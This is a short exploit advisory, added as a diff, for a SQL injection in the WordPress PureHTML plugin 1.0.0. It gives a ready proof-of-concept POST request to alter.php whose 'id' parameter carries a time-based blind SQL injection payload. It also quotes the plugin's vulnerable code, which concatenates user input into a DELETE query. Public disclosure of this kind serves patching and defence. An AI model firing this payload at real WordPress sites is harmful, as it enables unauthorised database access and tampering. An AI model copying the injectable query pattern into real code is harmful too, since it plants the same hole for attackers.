@@ -1,0 +1,30 @@
+# Exploit Title: WordPress PureHTML plugin <= 1.0.0 SQL Injection Vulnerability
+# Date: 2011-08-31
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/pure-html.1.0.0.zip
+# Version: 1.0.0 (tested)
+# Note: magic_quotes has to be turned off
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/pure-html/alter.php
+ PureHTMLNOnce=1&action=delete&id=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+if(!isset($_POST['PureHTMLNOnce'])){
+    if ( !wp_verify_nonce( $_POST['PureHTMLNOnce'], plugin_basename(__FILE__) )) {header("location:".$refer);}
+}
+else{
+    ...
+    if(isset($_POST['id'])){$id = $_POST['id'];}else{$id='0';}
+    ...
+    $action = $_POST['action'];
+    
+    #delete
+    if($action == "delete"){
+        $sql = "delete from ".$wpdb->prefix."pureHTML_functions WHERE id='".$id."'";
+        $wpdb->query($wpdb->prepare($sql)); //misusage of $wpdb->prepare() :)
+
